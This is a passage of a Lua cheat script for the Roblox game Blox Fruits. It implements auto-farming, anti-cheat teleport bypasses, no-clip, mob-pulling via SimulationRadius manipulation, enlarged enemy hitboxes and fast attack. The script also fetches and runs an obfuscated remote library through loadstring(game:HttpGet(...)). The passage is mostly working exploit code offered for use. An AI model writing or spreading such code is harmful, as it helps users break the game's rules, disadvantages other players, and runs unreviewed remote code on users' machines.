		[6] = Mon,
		[7] = MobCFrame,
		[8] = MonQ,
		[9] = MobCFrameNuber
	}
	end
	function Bypass(Point)
		toposition(game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame)
		wait(1.5)
		_G.StopTween = true
		_G.StertScript = false
	
		game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("AbandonQuest")
		game.Players.LocalPlayer.Character.Head:Destroy()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Point * CFrame.new(0,50,0)
		wait(.2)
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Point
		wait(.1)
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Point * CFrame.new(0,50,0)
		game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
		wait(.1)
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Point
		wait(0.5)
		game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Point * CFrame.new(900,900,900)
		game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("AbandonQuest")
	
		_G.StopTween = false
		_G.StertScript = false
		_G.Clip = false
		if game:GetService("Players").LocalPlayer.Character.HumanoidRootPart:FindFirstChild("BodyClip") then
			game:GetService("Players").LocalPlayer.Character.HumanoidRootPart:FindFirstChild("BodyClip"):Destroy()
		end
		_G.Clip = false
	end
	
local function toTarget(...)
	local RealtargetPos = {...}
	local targetPos = RealtargetPos[1]
	local RealTarget
	if type(targetPos) == "vector" then
		RealTarget = CFrame.new(targetPos)
	elseif type(targetPos) == "userdata" then
		RealTarget = targetPos
	elseif type(targetPos) == "number" then
		RealTarget = CFrame.new(unpack(RealtargetPos))
	end

	if game.Players.LocalPlayer.Character:WaitForChild("Humanoid").Health == 0 then if tween then tween:Cancel() end repeat wait() until game.Players.LocalPlayer.Character:WaitForChild("Humanoid").Health > 0; wait(0.2) end

	local tweenfunc = {}
	local Distance = (RealTarget.Position - game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart").Position).Magnitude
	if Distance < 1000 then
		Speed = 315
	elseif Distance >= 1000 then
		Speed = 300
	end

	if _G.Settings.Configs["Bypass TP"] then
		if Distance > 3000 and not AutoFarmMaterial and not _G.Settings.FightingStyle["Auto God Human"] and not _G.Settings.Raids["Auto Raids"] and not (game.Players.LocalPlayer.Backpack:FindFirstChild("Special Microchip") or game.Players.LocalPlayer.Character:FindFirstChild("Special Microchip") or game.Players.LocalPlayer.Backpack:FindFirstChild("God's Chalice") or game.Players.LocalPlayer.Character:FindFirstChild("God's Chalice") or game.Players.LocalPlayer.Backpack:FindFirstChild("Hallow Essence") or game.Players.LocalPlayer.Character:FindFirstChild("Hallow Essence") or game.Players.LocalPlayer.Character:FindFirstChild("Sweet Chalice") or game.Players.LocalPlayer.Backpack:FindFirstChild("Sweet Chalice")) and not (Name == "Fishman Commando [Lv. 400]" or Name == "Fishman Warrior [Lv. 375]") then
			pcall(function()
				tween:Cancel()
				fkwarp = false

				if game:GetService("Players")["LocalPlayer"].Data:FindFirstChild("SpawnPoint").Value == tostring(GetIsLand(RealTarget)) then 
					wait(.1)
					Com("F_","TeleportToSpawn")
				elseif game:GetService("Players")["LocalPlayer"].Data:FindFirstChild("LastSpawnPoint").Value == tostring(GetIsLand(RealTarget)) then
					game:GetService("Players").LocalPlayer.Character:WaitForChild("Humanoid"):ChangeState(15)
					wait(0.1)
					repeat wait() until game:GetService("Players").LocalPlayer.Character:WaitForChild("Humanoid").Health > 0
				else
					if game:GetService("Players").LocalPlayer.Character:WaitForChild("Humanoid").Health > 0 then
						if fkwarp == false then
							game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = RealTarget
						end
						fkwarp = true
					end
					wait(.08)
					game:GetService("Players").LocalPlayer.Character:WaitForChild("Humanoid"):ChangeState(15)
					repeat wait() until game:GetService("Players").LocalPlayer.Character:WaitForChild("Humanoid").Health > 0
					wait(.1)
					Com("F_","SetSpawnPoint")
				end
				wait(0.2)

				return
			end)
		end
	end

	local tween_s = game:service"TweenService"
	local info = TweenInfo.new((RealTarget.Position - game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart").Position).Magnitude/Speed, Enum.EasingStyle.Linear)
	local tweenw, err = pcall(function()
		tween = tween_s:Create(game.Players.LocalPlayer.Character["HumanoidRootPart"], info, {CFrame = RealTarget})
		tween:Play()
	end)

	function tweenfunc:Stop()
		tween:Cancel()
	end 

	function tweenfunc:Wait()
		tween.Completed:Wait()
	end 

	return tweenfunc
end
function InMyNetWork(object)
	if isnetworkowner then
		return isnetworkowner(object)
	else
		if (object.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 350 then 
			return true
		end
		return false
	end
end
spawn(function()
	while true do wait()
		if setscriptable then
			setscriptable(game.Players.LocalPlayer, "SimulationRadius", true)
		end
		if sethiddenproperty then
			sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius", math.huge)
		end
	end
end)
local SetCFarme = 1
local function GetIsLand(...)
	local RealtargetPos = {...}
	local targetPos = RealtargetPos[1]
	local RealTarget
	if type(targetPos) == "vector" then
		RealTarget = targetPos
	elseif type(targetPos) == "userdata" then
		RealTarget = targetPos.Position
	elseif type(targetPos) == "number" then
		RealTarget = CFrame.new(unpack(RealtargetPos))
		RealTarget = RealTarget.p
	end

	local ReturnValue
	local CheckInOut = math.huge;
	if game.Players.LocalPlayer.Team then
		for i,v in pairs(game.Workspace._WorldOrigin.PlayerSpawns:FindFirstChild(tostring(game.Players.LocalPlayer.Team)):GetChildren()) do 
			local ReMagnitude = (RealTarget - v:GetModelCFrame().p).Magnitude;
			if ReMagnitude < CheckInOut then
				CheckInOut = ReMagnitude;
				ReturnValue = v.Name
			end
		end
		if ReturnValue then
			return ReturnValue
		end 
	end
end


spawn(function()
	while task.wait() do
		pcall(function()
			if _G.AutoFarmLevelReal and BringMobFarm then
				for i,v in pairs(game.Workspace.Enemies:GetChildren()) do
					if not string.find(v.Name,"Boss") and (v.HumanoidRootPart.Position - PosMon.Position).magnitude <= 400 then
						if InMyNetWork(v.HumanoidRootPart) then
							v.HumanoidRootPart.CFrame = PosMon
							v.Humanoid.JumpPower = 0
							v.Humanoid.WalkSpeed = 0
							v.HumanoidRootPart.Size = Vector3.new(60,60,60)
							v.HumanoidRootPart.Transparency = 1
							v.HumanoidRootPart.CanCollide = false
							v.Head.CanCollide = false
							if v.Humanoid:FindFirstChild("Animator") then
								v.Humanoid.Animator:Destroy()
							end
							v.Humanoid:ChangeState(11)
							v.Humanoid:ChangeState(14)
							sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius",  math.huge)
						end
					end
				end
			end
		end)
	end
end)
function EquipWeapon(Tool)
	pcall(function()
		if game.Players.LocalPlayer.Backpack:FindFirstChild(Tool) then 
			local ToolHumanoid = game.Players.LocalPlayer.Backpack:FindFirstChild(Tool) 
			game.Players.LocalPlayer.Character.Humanoid:EquipTool(ToolHumanoid) 
		end
	end)
end
function UnEquipWeapon(Weapon)
	if game.Players.LocalPlayer.Character:FindFirstChild(Weapon) then
		_G.NotAutoEquip = true
		wait(.5)
		game.Players.LocalPlayer.Character:FindFirstChild(Weapon).Parent = game.Players.LocalPlayer.Backpack
		wait(.1)
		_G.NotAutoEquip = false
	end
end

spawn(function()
	while wait() do 
		local MyLevel = game.Players.LocalPlayer.Data.Level.Value
		local QuestC = game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest
		if _G.AutoFarmLevelReal then
if QuestC.Visible == true then
									if (QuestCheck()[2].Position - game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude >= 3000 then
										Bypass(QuestCheck()[2])
									end
									if game:GetService("Workspace").Enemies:FindFirstChild(QuestCheck()[3]) then
										for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
											if v.Name == QuestCheck()[3] then
												if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
													repeat task.wait()
														if not string.find(game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, QuestCheck()[6]) then
															game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("AbandonQuest")
														else
															PosMon = v.HumanoidRootPart.CFrame
															v.HumanoidRootPart.Size = Vector3.new(60,60,60)
															v.HumanoidRootPart.CanCollide = false
															v.Humanoid.WalkSpeed = 0
															v.Head.CanCollide = false
															BringMobFarm = true
															EquipWeapon(_G.Settings.Configs["Select Weapon"])
															v.HumanoidRootPart.Transparency = 1
															toTarget(v.HumanoidRootPart.CFrame * CFrame.new(0, 30, 5))
														end
													until not _G.AutoFarmLevelReal or not v.Parent or v.Humanoid.Health <= 0 or QuestC.Visible == false or not v:FindFirstChild("HumanoidRootPart")
												end
											end
										end
									else
										UnEquipWeapon(_G.Settings.Configs["Select Weapon"])
										toTarget(QuestCheck()[7][SetCFarme] * CFrame.new(0,30,5))
										if (QuestCheck()[7][SetCFarme].Position - game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 50 then
											if SetCFarme == nil or SetCFarme == '' then
												SetCFarme = 1
												print(SetCFarme)
											elseif SetCFarme >= #QuestCheck()[7] then
												SetCFarme = 1
												print(SetCFarme)
											end
											SetCFarme =  SetCFarme + 1
			
											print(SetCFarme)
											wait(0.5)
										end
									end
								else
									wait(0.5)
									if game:GetService("Players").LocalPlayer.Data.LastSpawnPoint.Value == tostring(GetIsLand(QuestCheck()[7][1])) then
										game:GetService('ReplicatedStorage').Remotes.CommF_:InvokeServer("StartQuest", QuestCheck()[4], QuestCheck()[1]) wait(0.5)
										toTarget(QuestCheck()[7][1] * CFrame.new(0,30,20))
									else
										if (QuestCheck()[2].Position - game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude >= 3000 then
											Bypass(QuestCheck()[2])
										else
											repeat wait() toTarget(QuestCheck()[2]) until (QuestCheck()[2].Position - game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 20 or not _G.StartFarm
										end
										repeat wait() toTarget(QuestCheck()[2]) until (QuestCheck()[2].Position - game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 20 or not _G.StartFarm
										if (QuestCheck()[2].Position - game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 1 then
											BringMobFarm = false
											wait(0.2)
											game:GetService('ReplicatedStorage').Remotes.CommF_:InvokeServer("StartQuest", QuestCheck()[4], QuestCheck()[1]) wait(0.5)
											toTarget(QuestCheck()[7][1] * CFrame.new(0,30,20))
										end
									end
								end
							end
						end
						end)
						local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/minhhau207/SilverHub/main/obfuscated-3788.lua"))()

						local Main = Library.xova()

						local Tab1 = Main.create("เมนูหลัก")
						
						local Tab2 = Main.create("ผู้เล่น/สเเตก")
						
						local Tab3 = Main.create("วาป/ดันเจี้ยน")
						
						local Tab4 = Main.create("ร้านค้า")
						
						local Tab5 = Main.create("อื่น ๆ")
						
						-------------[Tab1]-------------
						
						local Page1 = Tab1.xovapage(1)
						
						local Page2 = Tab1.xovapage(1)
						
						local Page3 = Tab1.xovapage(2)
						
						local Page8 = Tab1.xovapage(2)
						
						local Page4 = Tab1.xovapage(2)
						
						local Page5 = Tab1.xovapage(2)
						
						local Page6 = Tab1.xovapage(1)
						
						local Page7 = Tab1.xovapage(2)
						
						-------------[Tab2]-------------
						
						local Page9 = Tab2.xovapage(1)
						
						local Page15 = Tab2.xovapage(2)
						
						-------------[Tab3]-------------
						
						local Page10 = Tab3.xovapage(1)
						
						local Page11 = Tab3.xovapage(2)
						
						-------------[Tab4]-------------
						
						local Page12 = Tab4.xovapage(1)
						
						local Page13 = Tab4.xovapage(2)
						
						-------------[Tab5]-------------
						
						local Page14 = Tab5.xovapage(1)
						
						local Page16 = Tab5.xovapage(2)
						
						Page1.Label({
							Title = "Main",
						})
						
Page1.Toggle({
	Title = "Auto Farm Level",
	Mode = 2,
	Default = _G.Settings.Main["Auto Farm Level"],
	Desc = "Select Farm Type First",
	callback = function(value)
		_G.AutoFarmLevelReal = value
		Auto_Farm_Level = value
		if value == false then
			toTarget(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame)
		end
		SaveSettings()
	end,
})
Page3.Toggle({
	Title = "Fast Attack",
	Default = _G.Settings.Configs["Fast Attack"],
	callback = function(value)
		_G.Settings.Configs["Fast Attack"] = value
		SaveSettings()
	end,
})

Page3.Dropdown({
	Title = "Fast Attack Type",
	Item = {"Fast","Normal","Slow"},
	callback = function(value)
		_G.Settings.Configs["Fast Attack Type"] = value
		SaveSettings()
	end,
})

coroutine.wrap(function()
	while task.wait(.1) do
		local ac = CombatFrameworkR.activeController
		if ac and ac.equipped then
			if FastAttack and _G.Settings.Configs["Fast Attack"] then
				AttackFunction()
				if _G.Settings.Configs["Fast Attack Type"] == "Normal" then
					if tick() - cooldownfastattack > .9 then wait(.1) cooldownfastattack = tick() end
				elseif _G.Settings.Configs["Fast Attack Type"] == "Fast" then
					if tick() - cooldownfastattack > 1.5 then wait(.01) cooldownfastattack = tick() end
				elseif _G.Settings.Configs["Fast Attack Type"] == "Slow" then
					if tick() - cooldownfastattack > .3 then wait(.7) cooldownfastattack = tick() end
				end
			elseif FastAttack and _G.Settings.Configs["Fast Attack"] == false then
				if ac.hitboxMagnitude ~= 55 then
					ac.hitboxMagnitude = 55
				end
				ac:attack()
			end
		end
	end
end)()

Page3.Line()
Page3.Toggle({
	Title = "Auto Haki",
	Default = _G.Settings.Configs["Auto Haki"],
	callback = function(value)
		_G.Settings.Configs["Auto Haki"] = value
		SaveSettings()
	end,
})
spawn(function()
	while wait() do
if _G.Settings.Configs["Auto Haki"] then
	if not game.Players.LocalPlayer.Character:FindFirstChild("HasBuso") then
		game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("Buso")
	end
end
end
end)
-- [Table Weapon]
Weapon = {
	"Melee",
	"Sword",
	"Fruit"
}
Page3.Line()
Page3.Dropdown({
	Title = "Select Weapon",
	Item = Weapon,
	callback = function(value)
		SelectWeapon = value
	end,
})

task.spawn(function()
	while wait() do
		pcall(function()
			if SelectWeapon == "Melee" then
				for i ,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v.ToolTip == "Melee" then
						if game.Players.LocalPlayer.Backpack:FindFirstChild(tostring(v.Name)) then
							_G.Settings.Configs["Select Weapon"] = v.Name
						end
					end
				end
			elseif SelectWeapon == "Sword" then
				for i ,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v.ToolTip == "Sword" then
						if game.Players.LocalPlayer.Backpack:FindFirstChild(tostring(v.Name)) then
							_G.Settings.Configs["Select Weapon"] = v.Name
						end
					end
				end
			elseif SelectWeapon == "Fruit" then
				for i ,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v.ToolTip == "Blox Fruit" then
						if game.Players.LocalPlayer.Backpack:FindFirstChild(tostring(v.Name)) then
							_G.Settings.Configs["Select Weapon"] = v.Name
						end
					end
				end
			else
				for i ,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					if v.ToolTip == "Melee" then
						if game.Players.LocalPlayer.Backpack:FindFirstChild(tostring(v.Name)) then
							_G.Settings.Configs["Select Weapon"] = v.Name
						end
					end
				end
			end
		end)
	end
end)
spawn(function()
while wait() do 
	if _G.AutoFarmLevelReal then
		if syn then
			setfflag("HumanoidParallelRemoveNoPhysics", "False")
			setfflag("HumanoidParallelRemoveNoPhysicsNoSimulate2", "False")
			game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
			if game.Players.LocalPlayer.Character:WaitForChild("Humanoid").Sit == true then
				game.Players.LocalPlayer.Character:WaitForChild("Humanoid").Sit = false
			end
		else
			if game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
				if not game:GetService("Players").LocalPlayer.Character.HumanoidRootPart:FindFirstChild("BodyVelocity1") then
					if game.Players.LocalPlayer.Character:WaitForChild("Humanoid").Sit == true then
						game.Players.LocalPlayer.Character:WaitForChild("Humanoid").Sit = false
					end
					local BodyVelocity = Instance.new("BodyVelocity")
					BodyVelocity.Name = "BodyVelocity1"
					BodyVelocity.Parent =  game:GetService("Players").LocalPlayer.Character.HumanoidRootPart
					BodyVelocity.MaxForce = Vector3.new(10000, 10000, 10000)
					BodyVelocity.Velocity = Vector3.new(0, 0, 0)
				end
			end
			for _, v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
				if v:IsA("BasePart") then
					v.CanCollide = false    
				end
			end
		end
	else
		if game.Players.LocalPlayer.Character.HumanoidRootPart:FindFirstChild("BodyVelocity1") then
			game.Players.LocalPlayer.Character.HumanoidRootPart:FindFirstChild("BodyVelocity1"):Destroy();
		end
	end
end
end)